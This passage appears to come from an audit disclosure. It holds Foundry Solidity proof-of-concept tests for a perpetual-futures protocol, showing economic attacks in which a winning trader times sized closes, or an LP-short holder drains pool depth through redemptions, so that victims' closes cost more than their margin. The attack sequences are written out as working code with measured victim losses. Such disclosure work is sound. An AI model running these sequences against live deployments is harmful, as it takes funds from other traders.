    /// 2. No prior claim. Control: frank, gina, then dave close in that order. Attack: dave's sized close is paid in
    /// cash and leaves D one lot above zero; frank closes; dave re-sizes if his remaining gain allows; gina closes;
    /// dave closes the rest. Every party's delta ATTACK minus CONTROL, cash and claims separate; the sum is zero.
    function test_2_winnerTunesDepth_allParties() public {
        _build(false);
        address[7] memory who = [dave, frank, gina, erin, carol, bob, keeper];
        int256[7] memory cashC;
        int256[7] memory claimC;
        int256[7] memory cashA;
        int256[7] memory claimA;
        int256[3] memory restC; // poolSide, treasury, junior principal (simulated)
        int256[3] memory restA;
        for (uint256 arm; arm < 2; ++arm) {
            uint256 snap = vm.snapshotState();
            uint256 n = now_;
            int256[7] memory c0;
            int256[7] memory k0;
            for (uint256 i; i < 7; ++i) {
                c0[i] = _cash(who[i]);
                k0[i] = _claim(who[i]);
            }
            int256 p0 = _poolSide();
            int256 t0 = _treasury();
            (, uint256 j0,,) = pool.getPendingTrancheState();
            if (arm == 0) {
                _must(frank, CfdTypes.Side.SHORT, _size(frank), 0, true);
                _must(gina, CfdTypes.Side.SHORT, _size(gina), 0, true);
                _must(dave, CfdTypes.Side.SHORT, _size(dave), 0, true);
            } else {
                _sizedWinnerClose(dave);
                console2.log("attack: D after dave's sized close (atoms), dave claim:", engine.traderClaimBalanceAssets(dave));
                console2.logInt(_depth());
                _logPreview("frank close preview at that D", frank);
                _must(frank, CfdTypes.Side.SHORT, _size(frank), 0, true);
                console2.log("attack: D after frank's close:");
                console2.logInt(_depth());
                bool again = _sizedWinnerClose(dave);
                console2.log("attack: dave re-sized before gina?", again);
                console2.logInt(_depth());
                _must(gina, CfdTypes.Side.SHORT, _size(gina), 0, true);
                _must(dave, CfdTypes.Side.SHORT, _size(dave), 0, true);
            }
            (, uint256 j1,,) = pool.getPendingTrancheState();
            for (uint256 i; i < 7; ++i) {
                if (arm == 0) {
                    cashC[i] = _cash(who[i]) - c0[i];
                    claimC[i] = _claim(who[i]) - k0[i];
                } else {
                    cashA[i] = _cash(who[i]) - c0[i];
                    claimA[i] = _claim(who[i]) - k0[i];
                }
            }
            int256[3] memory r = [_poolSide() - p0, _treasury() - t0, int256(j1) - int256(j0)];
            console2.log("end of arm (0 CONTROL, 1 ATTACK) / pool assets / total trader claims", arm, pool.totalAssets(), engine.totalTraderClaimBalanceAssets());
            if (arm == 0) restC = r;
            else restA = r;
            vm.revertToState(snap);
            now_ = n;
            vm.warp(now_);
        }
        string[7] memory nm = ["dave (winner)", "frank (victim 1)", "gina (victim 2)", "erin (loser)", "carol", "bob (junior LP wallet)", "keeper"];
        int256 sum;
        console2.log("party: cash CONTROL, cash ATTACK, claim CONTROL, claim ATTACK, (cash+claim) ATTACK-CONTROL");
        for (uint256 i; i < 7; ++i) {
            console2.log(nm[i]);
            console2.logInt(cashC[i]);
            console2.logInt(cashA[i]);
            console2.logInt(claimC[i]);
            console2.logInt(claimA[i]);
            int256 d = (cashA[i] + claimA[i]) - (cashC[i] + claimC[i]);
            console2.logInt(d);
            sum += d;
        }
        console2.log("pool side (pool + vault tokens - claims): CONTROL, ATTACK, diff");
        console2.logInt(restC[0]);
        console2.logInt(restA[0]);
        console2.logInt(restA[0] - restC[0]);
        console2.log("treasury: CONTROL, ATTACK, diff");
        console2.logInt(restC[1]);
        console2.logInt(restA[1]);
        console2.logInt(restA[1] - restC[1]);
        console2.log("simulated junior principal change: CONTROL, ATTACK");
        console2.logInt(restC[2]);
        console2.logInt(restA[2]);
        sum += (restA[0] - restC[0]) + (restA[1] - restC[1]);
        console2.log("SUM of all ATTACK-CONTROL deltas:");
        console2.logInt(sum);
        assertEq(sum, 0, "conservation");
        assertLt((cashA[1] + claimA[1]) - (cashC[1] + claimC[1]), 0, "victim worse off");
    }

    /// 3. Bounded victim: same tiny-D state; frank's close carries maxActionChargeAssets = 1,000 USD. It fails; his free
    /// settlement cannot be withdrawn while the position is open in degraded mode; retries after 24 h and 7 days of
    /// marks; what ends it (erin closes her remaining loser). Control: the same bounded close at D = 0.
    function test_3_boundedVictimMarginalHarm() public {
        _build(true);
        uint256 snap = vm.snapshotState();
        uint256 n = now_;
        {
            OrderV3Types.ExecutionResult memory r = _trade(frank, CfdTypes.Side.SHORT, _size(frank), 0, true, 1_000e6);
            uint256 free = clearinghouse.getFreeBuyingPowerAssets(frank);
            vm.prank(frank);
            clearinghouse.withdraw(frank, free);
            console2.log("CONTROL (D = 0) bounded close status / withdrawn / claim", uint256(r.status), free, engine.traderClaimBalanceAssets(frank));
        }
        vm.revertToState(snap);
        now_ = n;
        vm.warp(now_);
        _erinCoversDeficit();
        uint256 bal0 = clearinghouse.balanceAssets(frank);
        uint256[3] memory waits = [uint256(0), 24 hours, 7 days];
        for (uint256 w; w < 3; ++w) {
            if (waits[w] > 0) {
                uint256 target = now_ + waits[w];
                while (now_ + 1 hours < target) {
                    _tick(1 hours);
                    _mark();
                }
            }
            OrderV3Types.ExecutionResult memory r = _trade(frank, CfdTypes.Side.SHORT, _size(frank), 0, true, 1_000e6);
            console2.log("TINY D, wait (s) / status / terminalReason", waits[w], uint256(r.status), uint256(r.terminalReason));
            console2.logInt(_depth());
            uint256 free = clearinghouse.getFreeBuyingPowerAssets(frank);
            vm.prank(frank);
            try clearinghouse.withdraw(frank, free) {
                console2.log("  withdraw of free settlement SUCCEEDED", free);
            } catch (bytes memory err) {
                console2.log("  withdraw of free settlement refused; free =", free);
                console2.logBytes(err);
            }
        }
        console2.log("frank balance before / after the waits", bal0, clearinghouse.balanceAssets(frank));
        // what ends it: erin closes her remaining loser
        _must(erin, CfdTypes.Side.LONG, _size(erin), 0, true);
        OrderV3Types.ExecutionResult memory r2 = _trade(frank, CfdTypes.Side.SHORT, _size(frank), 0, true, 1_000e6);
        console2.log("after erin's full close: D (atoms) / status", uint256(_depth()), uint256(r2.status));
    }

    /// 4. Position protection created in the healthy state (take profit 1.85, stop 0.30) with the close limits most
    /// repository tests use (unlimited) and with a finite 25,000 USD action-charge limit; triggered by a keeper at the
    /// tiny depth.
    function test_4_protectionAtTinyDepth() public {
        for (uint256 arm; arm < 2; ++arm) {
            uint256 snap0 = vm.snapshotState();
            _buildWithProtection(arm == 0 ? type(uint256).max : 25_000e6);
            _erinCoversDeficit();
            uint64 pid = router.positionProtectionBook().activePositionProtectionId(frank);
            int256 s = _cash(frank);
            _tick(2);
            bytes[] memory b = _blob(px, now_ - 1, now_ - 2);
            vm.prank(keeper);
            uint64 lid = book.triggerPositionProtection(pid, b);
            _tick(2);
            bytes[] memory b2 = _blob(px, now_ - 1, now_ - 2);
            vm.prank(keeper);
            OrderV3Types.ExecutionResult memory r = router.executeOrder(lid, b2);
            console2.log("PROTECTION arm (0 unlimited, 1 limit 25,000 USD) / close status / terminalReason", arm, uint256(r.status), uint256(r.terminalReason));
            console2.log("  frank size after / balance after", _size(frank), clearinghouse.balanceAssets(frank));
            console2.log("  frank cash delta:");
            console2.logInt(_cash(frank) - s);
            vm.revertToState(snap0);
        }
    }

    function _buildWithProtection(uint256 maxCharge) internal {
        // same as _build(true) but frank arms a protection right after opening, in the healthy state
        _release();
        book = IPositionProtectionActions(address(router.positionProtectionBook()));
        now_ = T0;
        vm.warp(now_);
        _setPx(100_000_000);
        _fund(carol, 100_000e6);
        _fund(dave, 200_000e6);
        _fund(erin, 400_000e6);
        _fund(frank, 100_000e6);
        _fund(gina, 100_000e6);
        _must(carol, CfdTypes.Side.LONG, 300_000e18, 30_000e6, false);
        _must(dave, CfdTypes.Side.SHORT, 300_000e18, 30_000e6, false);
        _must(erin, CfdTypes.Side.LONG, 300_000e18, 300_000e6, false);
        _must(dave, CfdTypes.Side.SHORT, 270_000e18, 30_000e6, false);
        _must(frank, CfdTypes.Side.SHORT, 30_000e18, 50_000e6, false);
        _must(gina, CfdTypes.Side.SHORT, 20_000e18, 50_000e6, false);
        _mark();
        PositionProtectionTypes.PositionProtectionParams memory pp;
        pp.takeProfitTriggerPrice = 185_000_000;
        pp.stopLossTriggerPrice = 30_000_000;
        pp.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: maxCharge,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.prank(frank);
        book.createPositionProtection(pp);
        (,,, uint256 maxJ) = pool.getPendingTrancheState();
        uint256 shares = juniorVault.balanceOf(bob) * (maxJ * 10_000 / pool.juniorPrincipal() - 1) / 10_000;
        _mark();
        vm.prank(bob);
        uint256 id = juniorVault.requestRedeem(shares, bob, bob);
        now_ = pool.lpEpochStart(id) + 30;
        vm.warp(now_);
        _tick(1);
        bytes[] memory b = _blob(px, now_ - 1, now_ - 2);
        vm.prank(keeper);
        router.settleLpEpoch(b);
        _mark();
        uint256 c = juniorVault.claimableRedeemRequest(id, bob);
        vm.prank(bob);
        juniorVault.claimRedeem(id, c, bob, bob);
        _setPx(50_000_000);
        _must(carol, CfdTypes.Side.LONG, 300_000e18, 0, true);
        _setPx(190_000_000);
        uint256 lots = uint256(_depth()) / 90_000_000 + 200;
        _must(dave, CfdTypes.Side.SHORT, lots * 100e18, 0, true);
    }

    /// 5. Order of two honest actions by the claimant (dave: claim + open short) at a large D and at a tiny D:
    /// settle-then-close vs close-then-settle.
    function test_5_settleThenCloseOrder() public {
        _build(true);
        for (uint256 q; q < 2; ++q) {
            uint256 s1 = vm.snapshotState();
            uint256 n1 = now_;
            if (q == 0) _must(erin, CfdTypes.Side.LONG, 150_000e18, 0, true);
            else _erinCoversDeficit();
            int256 d = _depth();
            int256[2] memory out;
            for (uint256 order; order < 2; ++order) {
                uint256 snap = vm.snapshotState();
                uint256 n = now_;
                int256 w0 = _cash(dave) + _claim(dave);
                if (order == 0) {
                    _tick(1);
                    vm.prank(dave);
                    engine.settleTraderClaim(dave);
                    _must(dave, CfdTypes.Side.SHORT, _size(dave), 0, true);
                } else {
                    _must(dave, CfdTypes.Side.SHORT, _size(dave), 0, true);
                    _tick(1);
                    vm.prank(dave);
                    engine.settleTraderClaim(dave);
                }
                out[order] = _cash(dave) + _claim(dave) - w0;
                vm.revertToState(snap);
                now_ = n;
                vm.warp(now_);
            }
            console2.log("ORDER D (atoms), then dave settle-then-close / close-then-settle / difference:");
            console2.logInt(d);
            console2.logInt(out[0]);
            console2.logInt(out[1]);
            console2.logInt(out[1] - out[0]);
            vm.revertToState(s1);
            now_ = n1;
            vm.warp(now_);
        }
    }

    /// 6. FIFO: a later order cannot be executed before an earlier pending one.
    function test_6_fifoHeadOnly() public {
        _build(false);
        _mark();
        _tick(1);
        OrderV3Types.OrderRequest memory rf = _request(CfdTypes.Side.SHORT, _size(frank), 0, true, type(uint256).max);
        vm.prank(frank);
        router.commitOrder(rf);
        _tick(1);
        OrderV3Types.OrderRequest memory rd = _request(CfdTypes.Side.SHORT, 100_000e18, 0, true, type(uint256).max);
        vm.prank(dave);
        uint64 did = router.commitOrder(rd);
        _tick(2);
        bytes[] memory b = _blob(px, now_ - 1, now_ - 2);
        vm.prank(keeper);
        try router.executeOrder(did, b) {
            revert("later id executed before the head");
        } catch (bytes memory err) {
            console2.log("later order id cannot execute before the queue head; revert data:");
            console2.logBytes(err);
        }
    }
}
```

### Second test: a pool that was never degraded

Save the file below as `packages/perps/test/perps/HealthyDepthCloseVpi.t.sol` and run, from `packages/perps`:

```
forge test --match-path test/perps/HealthyDepthCloseVpi.t.sol -vv
```

Steps, public calls only after the release risk configuration:

1. Fresh fixture: bob's 1,000,000 USDG junior deposit and the 1,000 USDG seed in each tranche. Price P.
2. bob opens a short book up to 98 % of the skew cap.
3. The victim opens a 10-lot long with 200 USDG margin (1,000 USDG funded).
4. ATTACK: bob redeems junior shares up to the pool's own cap in each 1-hour epoch (`requestRedeem`, `settleLpEpoch`, `claimRedeem`) until the cap is below the 10 USDG minimum. CONTROL: the same epochs pass without redemptions.
5. The victim closes, and bob closes his book.

Every step asserts that the engine is not degraded and that total trader claims are zero.

Full source of `packages/perps/test/perps/HealthyDepthCloseVpi.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

import {console2} from "forge-std/console2.sol";

import {OrderRouterPythTestBase} from "./shared/OrderRouterTestBase.sol";

/// A minority voluntary close in a pool that is NEVER degraded and has NO trader claims is charged
/// k * (S_post^2 - S_pre^2) / (2D) of VPI, where D falls to the open book's maximum liability through ordinary LP
/// redemptions. A short book entered at price P has maximum profit n * (CAP - P), so near CAP the depth floor is a
/// small fraction of the skew and the charge exceeds the victim's margin. Public entrypoints only; tokens are minted
/// only to fund accounts before they act; no owner call after the fixture's configuration.
contract HealthyDepthCloseVpiTest is OrderRouterPythTestBase {
    address internal keeper = address(0x4EE9);
    address internal victor = address(0x71C7); // victim: 10-lot long minority, 200 USD margin
    // bob (fixture junior LP, 1,000,000 USD) also holds the short book: LP and short holder are one party.

    uint256 internal constant T0 = SETUP_TIMESTAMP + 10 hours;
    uint256 internal constant LOT = 100e18;
    uint256 internal constant VICTIM_LOTS = 10;
    uint256 internal constant VICTIM_MARGIN = 200e6;
    uint256 internal constant VICTIM_FUNDS = 1_000e6;
    uint256 internal constant MAX_EPOCHS = 8;

    uint256 internal now_;
    int64 internal px;

    // ------------------------------------------------------------------ fixture helpers
    function _release() internal {
        IHousePool.PoolConfig memory pc = _currentPoolConfig();
        pc.maxSeniorExposureAssets = 40_000_000e6;
        pc.maxSeniorShareBps = 8_000;
        pc.seniorRateBps = 800;
        pool.proposePoolConfig(pc);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        ICfdEngineAdminHost.EngineRiskConfig memory config;
        config.riskParams = CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5_000,
            protocolShareBps: 0
        });
        config.executionFeeBps = 4;
        config.frozenCloseSpreadBps = 50;
        config.settlementBufferBps = 25;
        engineAdmin.proposeRiskConfig(config);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        engineAdmin.finalizeRiskConfig();
    }

    function _blob(int64 price, uint256 t, uint256 tPrev) internal pure returns (bytes[] memory d) {
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](2);
        u[0] = MockPyth.FeedUpdate(FEED_A, MockPyth.MockPrice(price, 0, int32(-8), t, tPrev));
        u[1] = MockPyth.FeedUpdate(FEED_B, MockPyth.MockPrice(price, 0, int32(-8), t, tPrev));
        d = new bytes[](1);
        d[0] = abi.encode(u);
    }

    function _tick(uint256 dt) internal {
        now_ += dt;
        vm.warp(now_);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _mark() internal {
        _tick(2);
        bytes[] memory b = _blob(px, now_ - 1, now_ - 2);
        vm.prank(keeper);
        router.updateMarkPrice(b);
    }

    function _fund(address who, uint256 amt) internal {
        settlementToken.mint(who, amt);
        vm.startPrank(who);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(who, amt);
        vm.stopPrank();
    }

    function _request(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint256 maxCharge)
        internal
        view
        returns (OrderV3Types.OrderRequest memory req)
    {
        req = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(now_, size, margin, isClose, gasleft())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + uint64(router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: maxCharge,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    /// Commit through the production V3 entrypoint and self-execute two seconds later at the current price.
    function _trade(address a, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint256 maxCharge)
        internal
        returns (OrderV3Types.ExecutionResult memory r)
    {
        if (engine.lastMarkTime() + 40 < now_) _mark();
        _tick(1);
        OrderV3Types.OrderRequest memory req = _request(side, size, margin, isClose, maxCharge);
        vm.prank(a);
        uint64 id = router.commitOrder(req);
        _tick(2);
        bytes[] memory b = _blob(px, now_ - 1, now_ - 2);
        vm.prank(a);
        r = router.executeOrder(id, b);
    }

    function _must(address a, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose) internal {
        OrderV3Types.ExecutionResult memory r = _trade(a, side, size, margin, isClose, type(uint256).max);
        require(r.status == OrderV3Types.LifecycleStatus.Executed, "trade not executed");
    }

    function _size(address a) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(a);
    }

    function _cash(address a) internal view returns (int256) {
        return int256(settlementToken.balanceOf(a) + clearinghouse.balanceAssets(a));
    }

    function _depth() internal view returns (uint256) {
        return pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
    }

    function _maxLiab() internal view returns (uint256) {
        (uint256 l,,,) = engine.sides(0);
        (uint256 s,,,) = engine.sides(1);
        return l > s ? l : s;
    }

    function _skew() internal view returns (uint256) {
        (, uint256 lo,,) = engine.sides(0);
        (, uint256 so,,) = engine.sides(1);
        uint256 d = lo > so ? lo - so : so - lo;
        return d * uint256(uint64(px)) / 1e20;
    }

    function _treasury() internal view returns (int256) {
        address t = engine.protocolTreasury();
        return int256(settlementToken.balanceOf(t) + clearinghouse.balanceAssets(t));
    }

    /// Bob's total: wallet + clearinghouse + value of his junior shares at the pool's own redemption estimate.
    function _bobTotal() internal view returns (int256) {
        return _cash(bob) + int256(juniorVault.estimateRedeemAssets(juniorVault.balanceOf(bob)));
    }

    /// The fixture's seed holder (this contract): its junior and senior seed shares at the pool's redemption estimate.
    function _seedTotal() internal view returns (int256) {
        return int256(juniorVault.estimateRedeemAssets(juniorVault.balanceOf(address(this))))
            + int256(seniorVault.estimateRedeemAssets(seniorVault.balanceOf(address(this))));
    }

    /// Every token outside the minter: victim, bob, keeper, treasury, the fixture's seed holder, pool, vaults,
    /// router and engine. Constant after funding.
    function _sys() internal view returns (int256 s) {
        s = _cash(victor) + _cash(bob) + _cash(keeper) + _treasury() + _cash(address(this));
        s += int256(settlementToken.balanceOf(address(pool)) + settlementToken.balanceOf(address(juniorVault))
            + settlementToken.balanceOf(address(seniorVault)) + settlementToken.balanceOf(address(router))
            + settlementToken.balanceOf(address(engine)));
        s += int256(clearinghouse.balanceAssets(address(pool)) + clearinghouse.balanceAssets(address(router))
            + clearinghouse.balanceAssets(address(engine)));
    }

    function _healthy(string memory step) internal view {
        require(!engine.degradedMode(), string.concat("degraded at ", step));
        require(engine.totalTraderClaimBalanceAssets() == 0, string.concat("claims at ", step));
        console2.log(string.concat("  [", step, "] D / maxLiab / skew"), _depth(), _maxLiab(), _skew());
    }

    // ------------------------------------------------------------------ timeline
    struct Result {
        uint256 dBefore;
        uint256 maxLiab;
        uint256 skewBefore;
        uint256 skewAfter;
        int256 vpi;
        uint256 notional;
        bool closed;
        int256 victim;
        int256 bob;
        int256 poolAssets;
        int256 treasury;
        int256 keeperW;
        int256 seed;
        int256 sysResidual;
    }

    uint256[MAX_EPOCHS] internal epochTimes;

    /// Fresh pool (fixture: junior 1,000,000 USD from bob + 1,000 USD seeds per tranche). Price P; bob shorts up to
    /// 98 % of the skew cap; victor opens a 10-lot long with 200 USD margin; then epochs pass with (attack) or without
    /// (control) bob redeeming junior shares to the pool's cap each epoch; victor closes.
    function _build(int64 p) internal returns (int256 sys0) {
        _release();
        now_ = T0;
        vm.warp(now_);
        px = p;
        _mark();
        _fund(bob, 300_000e6);
        _fund(victor, VICTIM_FUNDS);
        _healthy("fresh pool");
        uint256 lots = (_depth() * 4 / 10) * 98 / 100 / uint256(uint64(px));
        _must(bob, CfdTypes.Side.SHORT, lots * LOT, 40_000e6, false);
        console2.log("  bob short lots at px", lots, uint256(uint64(px)));
        _healthy("after bob's short book");
        _must(victor, CfdTypes.Side.LONG, VICTIM_LOTS * LOT, VICTIM_MARGIN, false);
        _healthy("after victim's 10-lot long");
        sys0 = _sys();
    }

    function _epochs(bool redeem) internal {
        for (uint256 i; i < MAX_EPOCHS; ++i) {
            _mark();
            uint256 id;
            if (redeem) {
                (,,, uint256 maxJ) = pool.getPendingTrancheState();
                uint256 jp = pool.juniorPrincipal();
                uint256 bal = juniorVault.balanceOf(bob);
                uint256 shares = maxJ >= jp ? bal : bal * maxJ / jp * 9_999 / 10_000;
                uint256 mx = juniorVault.maxRequestRedeem(bob);
                if (shares > mx) shares = mx;
                console2.log("  epoch / junior cap (assets) / shares requested", i, maxJ, shares);
                if (shares == 0 || maxJ < 10e6) break; // below 10 USD the vault refuses (TrancheVault__WithdrawalTooSmall)
                vm.prank(bob);
                id = juniorVault.requestRedeem(shares, bob, bob);
                epochTimes[i] = pool.lpEpochStart(id) + 30;
            } else if (epochTimes[i] == 0) {
                break;
            }
            now_ = epochTimes[i];
            vm.warp(now_);
            _tick(1);
            bytes[] memory b = _blob(px, now_ - 1, now_ - 2);
            vm.prank(keeper);
            router.settleLpEpoch(b);
            _mark();
            if (redeem) {
                uint256 c = juniorVault.claimableRedeemRequest(id, bob);
                if (c > 0) {
                    vm.prank(bob);
                    juniorVault.claimRedeem(id, c, bob, bob);
                }
            }
            _healthy(redeem ? "after LP epoch (bob redeems)" : "after LP epoch (no redemption)");
        }
    }

    function _closeVictim(uint256 maxCharge, Result memory r) internal {
        r.dBefore = _depth();
        r.maxLiab = _maxLiab();
        r.skewBefore = _skew();
        r.notional = VICTIM_LOTS * uint256(uint64(px));
        ICfdEngineTypes.ClosePreview memory pv = engineLens.previewClose(victor, VICTIM_LOTS * LOT, uint256(uint64(px)));
        r.vpi = pv.vpiDeltaAssets;
        OrderV3Types.ExecutionResult memory x =
            _trade(victor, CfdTypes.Side.LONG, VICTIM_LOTS * LOT, 0, true, maxCharge);
        r.closed = x.status == OrderV3Types.LifecycleStatus.Executed;
        if (!r.closed) console2.log("  victim close status / terminal reason", uint8(x.status), uint8(x.terminalReason));
        r.skewAfter = _skew();
        _healthy(r.closed ? "after victim close" : "after refused victim close");
    }

    function _endBob() internal {
        // bob closes his short book so his result is cash + shares
        uint256 s = _size(bob);
        if (s > 0) _must(bob, CfdTypes.Side.SHORT, s, 0, true);
        _healthy("after bob closes his book");
    }

    function _run(int64 p, bool redeem, uint256 maxCharge) internal returns (Result memory r) {
        int256 sys0 = _build(p);
        int256 v0 = _cash(victor);
        int256 b0 = _bobTotal();
        int256 pa0 = int256(pool.totalAssets());
        int256 t0 = _treasury();
        int256 k0 = _cash(keeper);
        int256 sd0 = _seedTotal();
        _epochs(redeem);
        _closeVictim(maxCharge, r);
        _endBob();
        r.victim = _cash(victor) - v0;
        r.bob = _bobTotal() - b0;
        r.poolAssets = int256(pool.totalAssets()) - pa0;
        r.treasury = _treasury() - t0;
        r.keeperW = _cash(keeper) - k0;
        r.seed = _seedTotal() - sd0;
        r.sysResidual = _sys() - sys0;
    }

    function _log(string memory tag, Result memory r) internal pure {
        console2.log(tag);
        console2.log("  D at close / maxLiab / skew before / skew after", r.dBefore, r.maxLiab);
        console2.log("    ", r.skewBefore, r.skewAfter);
        console2.log("  victim close VPI charge (atoms) / close notional / executed:");
        console2.logInt(r.vpi);
        console2.log("    ", r.notional, r.closed);
        console2.log("  charge in bps of close notional", r.vpi > 0 ? uint256(r.vpi) * 10_000 / r.notional : 0);
        console2.log("  deltas from just after the victim's open: victim / bob (cash+shares) / pool assets / treasury / keeper / seed LP shares / SYS");
        console2.logInt(r.victim);
        console2.logInt(r.bob);
        console2.logInt(r.poolAssets);
        console2.logInt(r.treasury);
        console2.logInt(r.keeperW);
        console2.logInt(r.seed);
        console2.logInt(r.sysResidual);
    }

    function _arm(int64 p) internal {
        console2.log("==================== P (8 decimals)", uint256(uint64(p)));
        uint256 s = vm.snapshotState();
        console2.log("---- ATTACK: LP redemptions to cap, then victim closes");
        Result memory a = _run(p, true, type(uint256).max);
        vm.revertToState(s);
        console2.log("---- CONTROL: same epochs, no redemption, then victim closes");
        Result memory c = _run(p, false, type(uint256).max);
        vm.revertToState(s);
        _log("ATTACK", a);
        _log("CONTROL", c);
        console2.log("ATTACK - CONTROL: victim / bob (LP + short holder) / pool assets / treasury / seed LP shares");
        console2.logInt(a.victim - c.victim);
        console2.logInt(a.bob - c.bob);
        console2.logInt(a.poolAssets - c.poolAssets);
        console2.logInt(a.treasury - c.treasury);
        console2.logInt(a.seed - c.seed);
    }

    // ------------------------------------------------------------------ tests
    function test_1_price100() public {
        _arm(100_000_000);
    }

    function test_2_price150() public {
        _arm(150_000_000);
    }

    function test_3_price190() public {
        _arm(190_000_000);
    }

    function test_4_price198() public {
        _arm(198_000_000);
    }

    /// Bounded order at P = 1.90 after the redemptions: maxActionChargeAssets 10 USD. The close is refused; the victim
    /// keeps the position. Retries with the same bound after 1 day, 7 days and 30 days (no LP deposits arrive).
    function test_5_boundedOrder190() public {
        _build(190_000_000);
        uint256 s = vm.snapshotState();
        _epochs(true);
        Result memory r;
        int256 v0 = _cash(victor);
        _closeVictim(10e6, r);
        _log("BOUNDED 10 USD, first try", r);
        console2.log("  victim position lots kept", _size(victor) / LOT);
        uint256[3] memory waits = [uint256(1 days), 7 days, 30 days];
        uint256 waited;
        for (uint256 i; i < 3; ++i) {
            _tick(waits[i] - waited);
            waited = waits[i];
            _mark();
            Result memory q;
            _closeVictim(10e6, q);
            console2.log("  retry after seconds / executed / D / preview charge", waits[i], q.closed, q.dBefore);
            console2.logInt(q.vpi);
            if (q.closed) break;
        }
        console2.log("  victim cash change over the bounded attempts (carry only):");
        console2.logInt(_cash(victor) - v0);
        console2.log("  victim lots still open", _size(victor) / LOT);
        vm.revertToState(s);
    }

    // ------------------------------------------------------------------ 6. rebalancing opens
    address internal carol = address(0xCA201); // fresh third trader (would-be arbitrageur)
    address internal lp2 = address(0x1B2); // new junior LP for the way out

    /// Commit and execute one open for carol in a reverted snapshot; return whether it executed.
    function _tryOpen(CfdTypes.Side side, uint256 lots) internal returns (bool executed) {
        uint256 snap = vm.snapshotState();
        ICfdEngineTypes.OpenPreview memory pv =
            engineLens.previewOpen(carol, side, lots * LOT, 50_000e6, uint256(uint64(px)));
        console2.log(side == CfdTypes.Side.LONG ? "  open LONG (skew-reducing) lots" : "  open SHORT (skew-increasing) lots", lots);
        console2.log("    lens valid / OpenRevertCode (4 SKEW_TOO_HIGH, 7 SOLVENCY_EXCEEDED)", pv.valid, uint8(pv.invalidReason));
        console2.log("    lens VPI (negative = rebate):");
        console2.logInt(pv.vpiAssets);
        if (engine.lastMarkTime() + 40 < now_) _mark();
        _tick(1);
        OrderV3Types.OrderRequest memory req = _request(side, lots * LOT, 50_000e6, false, type(uint256).max);
        vm.prank(carol);
        try router.commitOrder(req) returns (uint64 id) {
            _tick(2);
            bytes[] memory b = _blob(px, now_ - 1, now_ - 2);
            vm.prank(carol);
            OrderV3Types.ExecutionResult memory r = router.executeOrder(id, b);
            executed = r.status == OrderV3Types.LifecycleStatus.Executed;
            console2.log("    committed; executed / status / terminal reason", executed, uint8(r.status), uint8(r.terminalReason));
        } catch (bytes memory err) {
            console2.log("    COMMIT REFUSED, revert data (0x2ae052ed = OrderRouter__PredictableOpenInvalid(code)):");
            console2.logBytes(err);
        }
        _healthy("after carol's open attempt");
        vm.revertToState(snap);
    }

    function _openSet(bool expectReducingOk) internal {
        uint256[4] memory sizes = [uint256(10), 50, 200, 1000];
        for (uint256 i; i < 4; ++i) {
            bool ok = _tryOpen(CfdTypes.Side.LONG, sizes[i]);
            require(ok == expectReducingOk, "rebalancing open outcome differs from expectation");
        }
        bool inc = _tryOpen(CfdTypes.Side.SHORT, 10);
        console2.log("  skew-increasing 10-lot short executed", inc);
    }

    function _depositJunior(uint256 amount) internal {
        settlementToken.mint(lp2, amount);
        vm.startPrank(lp2);
        settlementToken.approve(address(juniorVault), amount);
        uint256 id = juniorVault.requestDeposit(amount, lp2, lp2);
        vm.stopPrank();
        now_ = juniorVault.depositEpochStart(id) + 30;
        vm.warp(now_);
        _tick(1);
        bytes[] memory b = _blob(px, now_ - 1, now_ - 2);
        vm.prank(keeper);
        router.settleLpEpoch(b);
        _mark();
    }

    function _wayOut() internal {
        uint256[7] memory deps = [uint256(100e6), 1_000e6, 10_000e6, 100_000e6, 400_000e6, 800_000e6, 1_000_000e6];
        for (uint256 i; i < 7; ++i) {
            uint256 snap = vm.snapshotState();
            _depositJunior(deps[i]);
            _healthy("after new junior deposit epoch");
            ICfdEngineTypes.ClosePreview memory cv =
                engineLens.previewClose(victor, VICTIM_LOTS * LOT, uint256(uint64(px)));
            uint256 bps = cv.vpiDeltaAssets > 0
                ? uint256(cv.vpiDeltaAssets) * 10_000 / (VICTIM_LOTS * uint256(uint64(px)))
